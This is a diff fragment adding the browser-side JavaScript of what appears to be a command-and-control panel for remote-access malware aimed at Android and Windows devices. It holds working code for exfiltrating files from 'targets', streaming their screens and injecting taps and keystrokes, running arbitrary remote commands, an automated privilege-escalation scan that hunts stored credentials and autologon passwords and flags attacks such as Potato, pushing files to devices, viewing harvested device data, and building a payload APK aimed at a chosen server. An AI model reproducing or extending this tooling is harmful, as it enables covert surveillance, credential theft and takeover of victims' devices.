+  if (!files.length) {
+    body.innerHTML = '<div class="fm-empty"><div class="big">📂</div>Empty directory</div>';
+    return;
+  }
+
+  if (fmViewMode === 'grid') fmRenderGrid(files, cp);
+  else fmRenderList(files, cp);
+  switchToTab('files');
+}
+
+function fmRenderGrid(files, cp) {
+  const body = document.getElementById('fmBody');
+  let html = '<div class="fm-grid">';
+  files.forEach(f => {
+    const fp = cp.replace(/\/$/, '') + '/' + f.name;
+    const icon = getFileIcon(f.name, f.is_dir);
+    const cls = f.is_dir ? 'fm-item dir' : 'fm-item';
+    const sizeLabel = f.is_dir ? '' : '<span class="fm-size">' + formatFileSize(f.size) + '</span>';
+    let actions = '';
+    if (f.is_dir) {
+      actions = '<div class="fm-actions"><span class="fm-act" onclick="event.stopPropagation();fmNavigate(\'' + escAttr(fp+'/') + '\')" title="Open">📂</span></div>';
+    } else {
+      actions = '<div class="fm-actions"><span class="fm-act grab" onclick="event.stopPropagation();grabFile(\'' + escAttr(fp) + '\')" title="Grab file">⬇</span></div>';
+    }
+    const click = f.is_dir ? 'onclick="fmNavigate(\'' + escAttr(fp+'/') + '\')"' : 'onclick="fmSelectItem(this)"';
+    const dblclick = f.is_dir ? 'ondblclick="fmNavigate(\'' + escAttr(fp+'/') + '\')"' : 'ondblclick="grabFile(\'' + escAttr(fp) + '\')"';
+    html += '<div class="' + cls + '" ' + click + ' ' + dblclick + '>' + actions + '<span class="fm-icon">' + icon + '</span><span class="fm-name" title="' + esc(f.name) + '">' + esc(f.name) + '</span>' + sizeLabel + '</div>';
+  });
+  html += '</div>';
+  body.innerHTML = html;
+}
+
+function fmRenderList(files, cp) {
+  const body = document.getElementById('fmBody');
+  let html = '<div class="fm-list"><div class="fm-lrow header"><span></span><span>Name</span><span style="text-align:right">Size</span><span>Modified</span><span></span></div>';
+  files.forEach(f => {
+    const fp = cp.replace(/\/$/, '') + '/' + f.name;
+    const icon = getFileIcon(f.name, f.is_dir);
+    const cls = f.is_dir ? 'fm-lrow dir' : 'fm-lrow';
+    const click = f.is_dir ? 'onclick="fmNavigate(\'' + escAttr(fp+'/') + '\')"' : 'onclick="fmSelectItem(this)"';
+    const dblclick = f.is_dir ? 'ondblclick="fmNavigate(\'' + escAttr(fp+'/') + '\')"' : 'ondblclick="grabFile(\'' + escAttr(fp) + '\')"';
+    let actions = '';
+    if (!f.is_dir) {
+      actions = '<span class="fm-act grab" onclick="event.stopPropagation();grabFile(\'' + escAttr(fp) + '\')" title="Grab">⬇</span>';
+    }
+    html += '<div class="' + cls + '" ' + click + ' ' + dblclick + '><span class="li">' + icon + '</span><span class="ln" title="' + esc(f.name) + '">' + esc(f.name) + '</span><span class="ls">' + (f.is_dir ? '—' : formatFileSize(f.size)) + '</span><span class="lm">' + formatDate(f.modified) + '</span><span class="la">' + actions + '</span></div>';
+  });
+  html += '</div>';
+  body.innerHTML = html;
+}
+
+function fmSelectItem(el) {
+  document.querySelectorAll('.fm-item.selected, .fm-lrow.selected').forEach(e => e.classList.remove('selected'));
+  el.classList.add('selected');
+}
+
+function toggleFmView() {
+  fmViewMode = fmViewMode === 'grid' ? 'list' : 'grid';
+  document.getElementById('viewToggle').textContent = fmViewMode === 'grid' ? '☰' : '▦';
+  if (fmFileData) {
+    const cp = fmFileData.path || fmCurrentPath;
+    const files = fmFileData.files || [];
+    if (fmViewMode === 'grid') fmRenderGrid(files, cp);
+    else fmRenderList(files, cp);
+  }
+}
+
+function grabFile(path) {
+  document.getElementById('exfilPathInput').value = path;
+  exfilFile();
+}
+
+let screenStreaming = false;
+let screenStreamTimer = null;
+let screenMouseStart = null;
+let screenLastFrameTime = 0;
+
+async function screenCapture() {
+  const target = document.getElementById('targetSelect').value || selectedTarget;
+  if (!target) { screenSetStatus('No target selected'); return; }
+  screenSetStatus('Capturing...');
+  const quality = parseInt(document.getElementById('screenQuality').value) || 40;
+  try {
+    const res = await fetch('/api/screenshot', {
+      method: 'POST', headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({target, quality})
+    });
+    const data = await res.json();
+    if (data.error) { screenSetStatus('Error: ' + data.error); return; }
+    screenLoadFrame(target);
+    screenSetStatus('Captured (' + (data.size/1024).toFixed(1) + ' KB)');
+  } catch(e) { screenSetStatus('Failed: ' + e.message); }
+}
+
+function screenLoadFrame(target) {
+  const img = document.getElementById('screenImg');
+  const placeholder = document.getElementById('screenPlaceholder');
+  const t = Date.now();
+  img.onload = function() { placeholder.style.display = 'none'; img.style.display = 'block'; screenLastFrameTime = t; };
+  img.onerror = function() {};
+  img.src = '/api/screen_frame?target=' + encodeURIComponent(target) + '&t=' + t;
+}
+
+function screenToggleStream() {
+  const btn = document.getElementById('btnStream');
+  if (screenStreaming) {
+    screenStreaming = false;
+    if (screenStreamTimer) { clearInterval(screenStreamTimer); screenStreamTimer = null; }
+    btn.textContent = '▶ Stream'; btn.classList.remove('stop');
+    screenSetStatus('Stopped');
+    const target = document.getElementById('targetSelect').value || selectedTarget;
+    if (target) fetch('/api/screen_stream', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({target, action:'stop'})});
+  } else {
+    const target = document.getElementById('targetSelect').value || selectedTarget;
+    if (!target) { screenSetStatus('No target'); return; }
+    screenStreaming = true;
+    btn.textContent = '⏹ Stop'; btn.classList.add('stop');
+    screenSetStatus('Streaming...');
+    let frameNum = 0;
+    const quality = parseInt(document.getElementById('screenQuality').value) || 40;
+    const doFrame = async () => {
+      if (!screenStreaming) return;
+      try {
+        const res = await fetch('/api/screenshot', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target, quality})});
+        const data = await res.json();
+        if (data.error) { screenSetStatus('Error: ' + data.error); return; }
+        screenLoadFrame(target);
+        frameNum++;
+        screenSetStatus('Streaming — frame ' + frameNum + ' (' + (data.size/1024).toFixed(1) + ' KB)');
+      } catch(e) { screenSetStatus('Stream error: ' + e.message); }
+      if (screenStreaming) screenStreamTimer = setTimeout(doFrame, 200);
+    };
+    doFrame();
+  }
+}
+
+function screenSetStatus(msg) { const el = document.getElementById('screenStatus'); if (el) el.textContent = msg; }
+
+function screenMouseDown(e) {
+  e.preventDefault();
+  const rect = e.target.getBoundingClientRect();
+  screenMouseStart = { x: e.clientX - rect.left, y: e.clientY - rect.top, w: rect.width, h: rect.height, time: Date.now() };
+}
+function screenMouseMove(e) {}
+function screenMouseUp(e) {
+  if (!screenMouseStart) return;
+  const rect = e.target.getBoundingClientRect();
+  const endX = e.clientX - rect.left, endY = e.clientY - rect.top;
+  const img = e.target;
+  const natW = img.naturalWidth || 1080, natH = img.naturalHeight || 2400;
+  const scaleX = natW / screenMouseStart.w, scaleY = natH / screenMouseStart.h;
+  const sx = Math.round(screenMouseStart.x * scaleX), sy = Math.round(screenMouseStart.y * scaleY);
+  const ex = Math.round(endX * scaleX), ey = Math.round(endY * scaleY);
+  const dist = Math.sqrt(Math.pow(endX - screenMouseStart.x, 2) + Math.pow(endY - screenMouseStart.y, 2));
+  const target = document.getElementById('targetSelect').value || selectedTarget;
+  const view = document.getElementById('screenView');
+  const marker = document.createElement('div');
+  marker.className = 'screen-tap-marker';
+  marker.style.left = (e.clientX - view.getBoundingClientRect().left) + 'px';
+  marker.style.top = (e.clientY - view.getBoundingClientRect().top) + 'px';
+  view.appendChild(marker);
+  setTimeout(() => marker.remove(), 500);
+  if (dist < 10) {
+    screenSendInput({target, type:'tap', x:sx, y:sy});
+    screenSetStatus('Tap: ' + sx + ', ' + sy);
+  } else {
+    const duration = Math.max(150, Math.min(Date.now() - screenMouseStart.time, 1000));
+    screenSendInput({target, type:'swipe', x1:sx, y1:sy, x2:ex, y2:ey, duration});
+    screenSetStatus('Swipe: ' + sx + ',' + sy + ' → ' + ex + ',' + ey);
+  }
+  screenMouseStart = null;
+  if (!screenStreaming) setTimeout(() => screenCapture(), 400);
+}
+
+async function screenSendInput(data) {
+  try { await fetch('/api/input', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)}); } catch(e) {}
+}
+
+function screenKey(keycode) {
+  const target = document.getElementById('targetSelect').value || selectedTarget;
+  if (!target) return;
+  screenSendInput({target, type:'key', keycode});
+  screenSetStatus('Key: ' + keycode);
+  if (!screenStreaming) setTimeout(() => screenCapture(), 500);
+}
+
+function screenSendText() {
+  const input = document.getElementById('screenTextInput');
+  const text = input.value; if (!text) return;
+  const target = document.getElementById('targetSelect').value || selectedTarget;
+  if (!target) return;
+  screenSendInput({target, type:'text', text});
+  input.value = '';
+  screenSetStatus('Sent text: ' + text);
+  if (!screenStreaming) setTimeout(() => screenCapture(), 500);
+}
+
+let termHistory = [];
+let termHistIdx = -1;
+let termBusy = false;
+
+async function quickCmd(cmd) {
+  const target = document.getElementById('targetSelect').value || selectedTarget;
+  if (!target) { alert('Select a target device first'); return; }
+  switchToTab('terminal');
+  termAppend('<div class="term-cmd-line">$ <span class="term-cmd-text">' + esc(cmd) + '</span></div>');
+  termAppend('<div class="term-spinner" id="termSpinner">⏳ executing...</div>');
+  termBusy = true;
+  try {
+    const res = await fetch('/api/exec', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target, command:cmd})});
+    const data = await res.json();
+    const spinner = document.getElementById('termSpinner'); if (spinner) spinner.remove();
+    if (data.error && !data.stdout && !data.stderr) {
+      termAppend('<div class="term-error">' + esc(data.error) + '</div>');
+    } else {
+      if (data.stdout) termAppend('<div class="term-stdout">' + esc(data.stdout) + '</div>');
+      if (data.stderr) termAppend('<div class="term-stderr">' + esc(data.stderr) + '</div>');
+      const ec = data.exit_code;
+      if (ec !== undefined && ec !== null) termAppend('<div class="term-exit ' + (ec===0?'ok':'fail') + '">exit: ' + ec + '</div>');
+    }
+  } catch(e) {
+    const spinner = document.getElementById('termSpinner'); if (spinner) spinner.remove();
+    termAppend('<div class="term-error">Request failed: ' + esc(e.message) + '</div>');
+  }
+  termBusy = false;
+}
+
+function quickCmdPrompt(prefix, promptText) {
+  const val = prompt(promptText);
+  if (val) quickCmd(prefix + val);
+}
+
+async function autoPrivesc() {
+  const target = document.getElementById('targetSelect').value || selectedTarget;
+  if (!target) { alert('Select a target device first'); return; }
+  const dev = currentDevices.find(d => (d.id || d.ip) === target);
+  const isWin = dev && dev.os_type === 'windows';
+
+  switchToTab('terminal');
+  termAppend('<div class="term-cmd-line" style="color:#ef4444;font-weight:bold">═══ 🔓 AUTO PRIVESC SCAN ═══</div>');
+
+  const winChecks = [
+    { label: '🔍 Current User & Privileges', cmd: 'whoami & echo --- & whoami /priv' },
+    { label: '👥 Group Memberships', cmd: 'whoami /groups' },
+    { label: '🔑 Local Administrators', cmd: 'net localgroup administrators' },
+    { label: '🗝️ Stored Credentials', cmd: 'cmdkey /list' },
+    { label: '🔐 Autologon Registry', cmd: 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"' },
+    { label: '📦 AlwaysInstallElevated', cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated 2>nul' },
+    { label: '🛤️ Unquoted Service Paths', cmd: 'wmic service get name,displayname,pathname,startmode 2>nul | findstr /i /v "C:\\\\Windows\\\\" | findstr /i "Auto"' },
+    { label: '💻 OS & Patch Level', cmd: 'systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"' },
+    { label: '🛡️ Firewall State', cmd: 'netsh advfirewall show allprofiles state' },
+    { label: '📝 Weak Folder ACLs', cmd: 'icacls "C:\\Program Files\\*" 2>nul | findstr /i "(F) (M) (W) Everyone Users Authenticated" | head -20' },
+    { label: '⏰ Elevated Scheduled Tasks', cmd: 'schtasks /query /fo LIST /v 2>nul | findstr /B /C:"TaskName" /C:"Run As User" | head -40' },
+    { label: '🌐 Listening Ports', cmd: 'netstat -ano | findstr LISTENING' },
+  ];
+
+  const androidChecks = [
+    { label: '🔍 Current User', cmd: 'id && whoami' },
+    { label: '🔑 Root Access (su)', cmd: 'su -c id 2>&1 || echo "[!] su not available — no root"' },
+    { label: '🐛 Debug Properties', cmd: 'echo "ro.debuggable=$(getprop ro.debuggable)" && echo "ro.secure=$(getprop ro.secure)" && echo "adb.root=$(getprop service.adb.root)" && echo "ro.build.type=$(getprop ro.build.type)"' },
+    { label: '🧰 Root Indicators', cmd: 'ls -la /system/xbin/ 2>/dev/null; which su busybox magisk 2>/dev/null; ls /sbin/su /system/bin/su 2>/dev/null || echo "[*] No root binaries found"' },
+    { label: '🐧 Kernel Version', cmd: 'cat /proc/version && uname -a' },
+    { label: '⚡ SUID Binaries', cmd: 'find / -perm -4000 2>/dev/null | head -30 || echo "[*] No SUID binaries accessible"' },
+    { label: '📝 World-Writable Files', cmd: 'find /data/local/tmp /system /vendor -writable 2>/dev/null | head -20 || echo "[*] No writable system files"' },
+    { label: '💾 Mount Flags', cmd: 'mount | grep -E "rw|nosuid|noexec" | head -20' },
+    { label: '📂 Sensitive Directories', cmd: 'ls -la /data/local/tmp/ 2>/dev/null && echo "---" && ls -la /data/misc/wifi/ 2>/dev/null && echo "---" && ls -la /data/system/ 2>/dev/null | head -10' },
+    { label: '🌐 Open Ports', cmd: 'ss -tlnp 2>/dev/null || cat /proc/net/tcp 2>/dev/null | head -20' },
+    { label: '📱 Dangerous Packages', cmd: 'pm list packages 2>/dev/null | grep -iE "supersu|magisk|root|xposed|frida|substrate|busybox" || echo "[*] No suspicious packages"' },
+    { label: '🔐 SELinux Status', cmd: 'getenforce 2>/dev/null && cat /sys/fs/selinux/enforce 2>/dev/null; echo "SELinux context: $(id -Z 2>/dev/null || echo N/A)"' },
+  ];
+
+  const checks = isWin ? winChecks : androidChecks;
+  const findings = [];
+
+  for (let i = 0; i < checks.length; i++) {
+    const chk = checks[i];
+    termAppend('<div class="term-cmd-line" style="color:#a78bfa">─── [' + (i+1) + '/' + checks.length + '] ' + chk.label + ' ───</div>');
+    termAppend('<div class="term-cmd-line">$ <span class="term-cmd-text">' + esc(chk.cmd) + '</span></div>');
+
+    try {
+      const res = await fetch('/api/exec', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target, command:chk.cmd})});
+      const data = await res.json();
+      const out = (data.stdout || '') + (data.stderr || '');
+
+      if (data.stdout) termAppend('<div class="term-stdout">' + esc(data.stdout) + '</div>');
+      if (data.stderr) termAppend('<div class="term-stderr">' + esc(data.stderr) + '</div>');
+
+      // Analyze for findings
+      const lower = out.toLowerCase();
+      if (isWin) {
+        if (chk.cmd.includes('whoami /priv') && /seimpersonate|seassignprimary|seloaddriver|sebackup|serestore|setakeownership|sedebug/i.test(out))
+          findings.push('🔴 DANGEROUS PRIVILEGES: SeImpersonate/SeDebug/etc found — Potato attack likely viable');
+        if (chk.cmd.includes('localgroup') && /\bAdministrators\b/i.test(out) && new RegExp(target.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'i').test(out))
+          findings.push('🟢 Already in Administrators group!');
+        if (chk.cmd.includes('cmdkey') && out.trim() && !lower.includes('currently stored credentials: none'))
+          findings.push('🔴 STORED CREDENTIALS found — try: runas /savecred');
+        if (chk.cmd.includes('AlwaysInstallElevated') && lower.includes('0x1'))
+          findings.push('🔴 AlwaysInstallElevated ENABLED — MSI privesc possible');
+        if (chk.cmd.includes('Autologon') && lower.includes('defaultpassword'))
+          findings.push('🔴 AUTOLOGON PASSWORD in registry!');
+        if (chk.cmd.includes('Unquoted') && out.trim().length > 10)
+          findings.push('🟡 Potential unquoted service paths found — investigate manually');
+        if (chk.cmd.includes('Weak Folder') && out.trim().length > 5)
+          findings.push('🟡 Weak folder permissions found in Program Files');
+      } else {
+        if (chk.cmd.includes('su -c') && lower.includes('uid=0'))
+          findings.push('🔴 ROOT ACCESS AVAILABLE via su!');
+        if (chk.cmd.includes('ro.debuggable') && lower.includes('ro.debuggable=1'))
+          findings.push('🔴 Device is DEBUGGABLE — adb root may work');
+        if (chk.cmd.includes('ro.debuggable') && lower.includes('ro.secure=0'))
+          findings.push('🔴 ro.secure=0 — ADB runs as root!');
+        if (chk.cmd.includes('which su') && (lower.includes('/su') || lower.includes('magisk')))
+          findings.push('🔴 Root binaries (su/magisk) found on device!');
+        if (chk.cmd.includes('-4000') && out.trim().length > 5)
+          findings.push('🟡 SUID binaries found — check for exploitable ones');
+        if (chk.cmd.includes('-writable') && out.trim().length > 5)
+          findings.push('🟡 World-writable system files found');
+        if (chk.cmd.includes('getenforce') && lower.includes('permissive'))
+          findings.push('🔴 SELinux is PERMISSIVE — significantly easier exploitation');
+        if (chk.cmd.includes('Dangerous') && !lower.includes('no suspicious'))
+          findings.push('🟡 Root/hooking packages detected on device');
+      }
+    } catch(e) {
+      termAppend('<div class="term-error">Check failed: ' + esc(e.message) + '</div>');
+    }
+  }
+
+  // Summary
+  termAppend('<div class="term-cmd-line" style="color:#ef4444;font-weight:bold">═══ 🔓 SCAN COMPLETE ═══</div>');
+  if (findings.length === 0) {
+    termAppend('<div class="term-stdout" style="color:#a3e635">✅ No obvious privilege escalation vectors found.\nTarget appears hardened. Manual analysis recommended.</div>');
+  } else {
+    termAppend('<div class="term-cmd-line" style="color:#fbbf24;font-weight:bold">⚠ ' + findings.length + ' FINDING(S):</div>');
+    findings.forEach((f, i) => {
+      const color = f.startsWith('🔴') ? '#ef4444' : f.startsWith('🟡') ? '#fbbf24' : '#a3e635';
+      termAppend('<div class="term-stdout" style="color:' + color + '">[' + (i+1) + '] ' + esc(f) + '</div>');
+    });
+  }
+}
+
+function termUpdateTarget() {
+  const el = document.getElementById('termTarget');
+  if (el) el.textContent = selectedTarget || 'no target';
+}
+
+function termClear() {
+  document.getElementById('termOutput').innerHTML = '<div class="term-welcome">Terminal cleared.</div>';
+}
+
+async function termExec() {
+  const input = document.getElementById('termInput');
+  const cmd = input.value.trim();
+  if (!cmd || termBusy) return;
+  const target = document.getElementById('targetSelect').value || selectedTarget;
+  if (!target) { termAppend('<div class="term-error">No target selected</div>'); return; }
+  termHistory.push(cmd); termHistIdx = termHistory.length; input.value = '';
+  termAppend('<div class="term-cmd-line">$ <span class="term-cmd-text">' + esc(cmd) + '</span></div>');
+  termAppend('<div class="term-spinner" id="termSpinner">⏳ executing...</div>');
+  termBusy = true;
+  try {
+    const res = await fetch('/api/exec', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target, command:cmd})});
+    const data = await res.json();
+    const spinner = document.getElementById('termSpinner'); if (spinner) spinner.remove();
+    if (data.error && !data.stdout && !data.stderr) {
+      termAppend('<div class="term-error">' + esc(data.error) + '</div>');
+    } else {
+      if (data.stdout) termAppend('<div class="term-stdout">' + esc(data.stdout) + '</div>');
+      if (data.stderr) termAppend('<div class="term-stderr">' + esc(data.stderr) + '</div>');
+      const ec = data.exit_code;
+      if (ec !== undefined && ec !== null) termAppend('<div class="term-exit ' + (ec===0?'ok':'fail') + '">exit: ' + ec + '</div>');
+    }
+  } catch(e) {
+    const spinner = document.getElementById('termSpinner'); if (spinner) spinner.remove();
+    termAppend('<div class="term-error">Request failed: ' + esc(e.message) + '</div>');
+  }
+  termBusy = false; input.focus();
+}
+
+function termAppend(html) {
+  const out = document.getElementById('termOutput');
+  const w = out.querySelector('.term-welcome'); if (w) w.remove();
+  out.insertAdjacentHTML('beforeend', html);
+  out.scrollTop = out.scrollHeight;
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+  const input = document.getElementById('termInput');
+  if (input) input.addEventListener('keydown', (e) => {
+    if (e.key === 'ArrowUp') { e.preventDefault(); if (termHistIdx > 0) { termHistIdx--; input.value = termHistory[termHistIdx]; } }
+    else if (e.key === 'ArrowDown') { e.preventDefault(); if (termHistIdx < termHistory.length - 1) { termHistIdx++; input.value = termHistory[termHistIdx]; } else { termHistIdx = termHistory.length; input.value = ''; } }
+  });
+});
+
+async function sendTask(task) {
+  const target = document.getElementById('targetSelect').value;
+  if (!target) { alert('Select a target device first'); return; }
+  const btn = document.getElementById('btn-' + task); if (btn) btn.classList.add('waiting');
+  await fetch('/api/send_task', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target, task})});
+  waitingForTask = task;
+  const tunnel = currentDevices.find(d => (d.id||d.ip) === target)?.tunnel;
+  showFeedback(tunnel ? '⚡ Sent <b>' + task + '</b> via tunnel' : '⏳ Queued <b>' + task + '</b>...', 'wait');
+}
+
+async function sendMessage() {
+  const target = document.getElementById('targetSelect').value;
+  if (!target) { alert('Select a target device first'); return; }
+  const message = document.getElementById('msgInput').value; if (!message) return;
+  await fetch('/api/send_task', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target, task:'set_message', message})});
+  waitingForTask = 'set_message';
+  showFeedback('⏳ Message queued...', 'wait');
+  document.getElementById('msgInput').value = '';
+}
+
+function showFeedback(html, cls) {
+  const fb = document.getElementById('cmdFeedback');
+  fb.innerHTML = html; fb.className = 'feedback show ' + cls;
+}
+function clearWaiting() {
+  waitingForTask = null;
+  document.querySelectorAll('.cmd-btn.waiting').forEach(b => b.classList.remove('waiting'));
+  const fb = document.getElementById('cmdFeedback');
+  fb.innerHTML = '✅ Response received'; fb.className = 'feedback show ok';
+  setTimeout(() => { fb.className = 'feedback'; }, 4000);
+}
+
+async function exfilFile() {
+  const target = document.getElementById('targetSelect').value;
+  if (!target) { alert('Select a target device first'); return; }
+  const path = document.getElementById('exfilPathInput').value.trim(); if (!path) { alert('Enter a file path'); return; }
+  await fetch('/api/send_task', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({target, task:'upload_file', path})});
+  waitingForTask = 'upload_file';
+  showFeedback('⏳ Grabbing <b>' + esc(path.split('/').pop()) + '</b>...', 'wait');
+}
+
+async function pushFile() {
+  const target = document.getElementById('targetSelect').value;
+  if (!target) { alert('Select a target device first'); return; }
+  const fi = document.getElementById('pushFileInput');
+  const dest = document.getElementById('pushDestInput').value.trim() || '/sdcard/Download/';
+  if (!fi.files.length) { alert('Select a file first'); return; }
+  const fd = new FormData();
+  fd.append('target', target); fd.append('dest_path', dest); fd.append('file', fi.files[0]);
+  const pfb = document.getElementById('pushFeedback');
+  pfb.innerHTML = '⏳ Uploading...'; pfb.className = 'feedback show wait';
+  try {
+    const res = await fetch('/api/push_file', {method:'POST', body:fd});
+    const j = await res.json();
+    if (j.error) { pfb.innerHTML = '❌ '+esc(j.error); pfb.className = 'feedback show'; pfb.style.color='var(--red)'; }
+    else { pfb.innerHTML = '✅ <b>' + esc(j.filename) + '</b> pushed'; pfb.className = 'feedback show ok'; }
+  } catch(e) { pfb.innerHTML='❌ Upload failed'; pfb.className='feedback show'; pfb.style.color='var(--red)'; }
+}
+
+async function fetchExfilFiles() {
+  try {
+    const res = await fetch('/api/exfil_files');
+    const files = await res.json();
+    const list = document.getElementById('exfilFilesList');
+    if (!files.length) { list.innerHTML = '<span style="color:var(--text3);font-size:11px">No files yet</span>'; return; }
+    list.innerHTML = files.map(f => '<div class="exfil-row"><span class="en" title="' + esc(f.remote_path) + '">' + esc(f.original || f.name) + '</span><span class="em">' + formatFileSize(f.size) + ' · ' + esc(f.device) + '</span><a href="/api/exfil_download/' + encodeURIComponent(f.name) + '" download>⬇</a></div>').join('');
+  } catch(e) {}
+}
+
+function renderDataView(beacon) {
+  const d = beacon.data || {};
+  const dv = document.getElementById('dataViewer');
+  let html = '<div class="dv-header"><h3>' + esc(beacon.device || 'Unknown') + '</h3><span class="log-tag log-tag-' + (d.type||'heartbeat').replace(/[^a-z_]/g,'') + '">' + esc(d.type||'heartbeat') + '</span><span style="font-size:11px;color:var(--text3)">' + esc(beacon.time) + '</span><span class="dv-raw-btn" onclick="document.getElementById(\'rawJson\').classList.toggle(\'show\')">{ } RAW</span></div>';
+
+  if (d.device || d.android || d.fingerprint) {
+    const isWin = d.os_type === 'windows';
+    html += section(isWin ? '💻' : '📱', 'Device', [
+      row('Device', d.device), row(isWin ? 'OS' : 'Android', d.android ? d.android + (isWin ? '' : ' (API ' + d.api + ')') : null),
+      row('Security Patch', d.security_patch), row(isWin ? 'Machine ID' : 'Android ID', d.android_id, true),
+      row(isWin ? 'Platform' : 'Fingerprint', d.fingerprint, true), row('Hardware', d.hardware),
+      row('Board', d.board), row('Product', d.product),
+      row('Bootloader', d.bootloader), row('Display', d.display),
+      row('Uptime', d.uptime_ms ? formatMs(d.uptime_ms) : null),
+      row('Emulator', d.is_emulator != null ? String(d.is_emulator) : null),
+    ]);
+  }
+  if (d.battery_pct != null) {
+    const bi = d.battery_pct > 60 ? '🟢' : d.battery_pct > 20 ? '🟡' : '🔴';
+    html += section('🔋', 'Battery', [
+      row('Level', bi + ' ' + d.battery_pct + '%'), row('Charging', d.battery_charging),
+      row('Temperature', d.battery_temp_c != null ? d.battery_temp_c + '°C' : null),
+    ]);
+  }
+  if (d.network_type || d.local_ips) {
+    const nr = [row('Type', d.network_type),
+      row('Internet', d.has_internet != null ? (d.has_internet ? '✅ Yes' : '❌ No') : null),
+      row('WiFi Speed', d.wifi_link_speed_mbps ? d.wifi_link_speed_mbps + ' Mbps' : null),
+      row('WiFi Freq', d.wifi_frequency_mhz ? d.wifi_frequency_mhz + ' MHz' : null),
+      row('WiFi RSSI', d.wifi_rssi != null ? d.wifi_rssi + ' dBm' : null),
+    ];
+    if (Array.isArray(d.local_ips)) d.local_ips.forEach(ip => nr.push(row('IP', ip, true)));
+    html += section('🌐', 'Network', nr);
+  }
+  if (d.storage_total_gb) {
+    html += section('💾', 'Storage & RAM', [
+      row('Storage', d.storage_used_gb + ' / ' + d.storage_total_gb + ' GB used'),
+      row('Free', d.storage_free_gb + ' GB'),
+      row('RAM', d.ram_available_mb + ' / ' + d.ram_total_mb + ' MB'),
+      row('Low Memory', d.ram_low != null ? (d.ram_low ? '⚠️ Yes' : '✅ No') : null),
+    ]);
+  }
+  if (d.screen_width || d.locale) {
+    html += section('⚙️', 'System', [
+      row('Screen', d.screen_width ? d.screen_width + ' × ' + d.screen_height + ' @ ' + d.screen_density + 'dpi' : null),
+      row('ABIs', Array.isArray(d.supported_abis) ? d.supported_abis.join(', ') : null),
+      row('Locale', d.locale), row('Timezone', d.timezone),
+      row('TZ Offset', d.timezone_offset_hrs != null ? 'UTC' + (d.timezone_offset_hrs >= 0 ? '+' : '') + d.timezone_offset_hrs : null),
+    ]);
+  }
+  if (Array.isArray(d.installed_apps) && d.installed_apps.length) {
+    html += '<div class="dv-section"><div class="dv-section-head"><span class="icon">📱</span> Installed Apps <span style="margin-left:auto;font-size:11px;color:var(--accent)">' + d.installed_apps.length + '</span></div><table class="apps-tbl"><thead><tr><th>App</th><th>Package</th><th>Version</th></tr></thead><tbody>';
+    d.installed_apps.forEach(a => { html += '<tr><td>' + esc(a.name||'?') + '</td><td class="pkg">' + esc(a.package||'?') + '</td><td>' + esc(a.version||'?') + '</td></tr>'; });
+    html += '</tbody></table></div>';
+  }
+  if (d.task === 'upload_file') {
+    html += section('📤', 'File Exfiltrated', [
+      row('File', d.filename), row('Path', d.path, true),
+      row('Size', d.size != null ? formatFileSize(d.size) : null),
+      row('Status', d.status ? '✅ ' + d.status : null),
+      row('Error', d.error ? '❌ ' + d.error : null),
+    ]);
+  }
+  if (d.task === 'download_file') {
+    html += section('📥', 'File Pushed', [
+      row('File', d.filename), row('Destination', d.dest_path, true),
+      row('Size', d.size != null ? formatFileSize(d.size) : null),
+      row('Status', d.status ? '✅ ' + d.status : null),
+      row('Error', d.error ? '❌ ' + d.error : null),
+    ]);
+  }
+  if (d.task === 'list_files' && Array.isArray(d.files)) {
+    html += '<div class="dv-section"><div class="dv-section-head"><span class="icon">📁</span> Files — ' + esc(d.path || '?') + ' <span style="margin-left:auto;font-size:11px;color:var(--accent)">' + d.files.length + ' items</span></div><table class="apps-tbl"><thead><tr><th>Name</th><th>Type</th><th>Size</th></tr></thead><tbody>';
+    d.files.forEach(f => { html += '<tr><td>' + getFileIcon(f.name, f.is_dir) + ' ' + esc(f.name) + '</td><td>' + (f.is_dir?'Dir':'File') + '</td><td>' + (f.is_dir?'—':formatFileSize(f.size)) + '</td></tr>'; });
+    html += '</tbody></table></div>';
+  }
+  if (d.task) {
+    html += section('📋', 'Task Info', [
+      row('Task', d.task), row('Status', d.status),
+      row('Timestamp', d.timestamp ? new Date(d.timestamp).toLocaleString() : null),
+    ]);
+  }
+  html += '<div class="raw-json" id="rawJson">' + esc(JSON.stringify(d, null, 2)) + '</div>';
+  dv.innerHTML = html;
+}
+
+function section(icon, title, rows) {
+  const f = rows.filter(r => r);
+  if (!f.length) return '';
+  return '<div class="dv-section"><div class="dv-section-head"><span class="icon">' + icon + '</span> ' + esc(title) + '</div><table class="dv-table">' + f.join('') + '</table></div>';
+}
+function row(label, value, hi) {
+  if (value == null || value === '') return null;
+  return '<tr><td class="lbl">' + esc(label) + '</td><td class="val' + (hi?' hi':'') + '">' + esc(String(value)) + '</td></tr>';
+}
+function formatMs(ms) {
+  const s=Math.floor(ms/1000),m=Math.floor(s/60),h=Math.floor(m/60),dd=Math.floor(h/24);
+  if(dd>0)return dd+'d '+h%24+'h '+m%60+'m';if(h>0)return h+'h '+m%60+'m';return m+'m '+s%60+'s';
+}
+
+async function generateApk() {
+  const ip = document.getElementById('apkIp').value.trim();
+  const port = document.getElementById('apkPort').value.trim() || '9090';
+  if (!ip) { alert('Enter a server IP'); return; }
+  document.getElementById('buildBtn').disabled = true;
+  document.getElementById('buildStatus').className = 'build-info';
+  document.getElementById('buildStatus').innerHTML = '<span class="spinner"></span> Building...';
+  document.getElementById('downloadBtn').style.display = 'none';
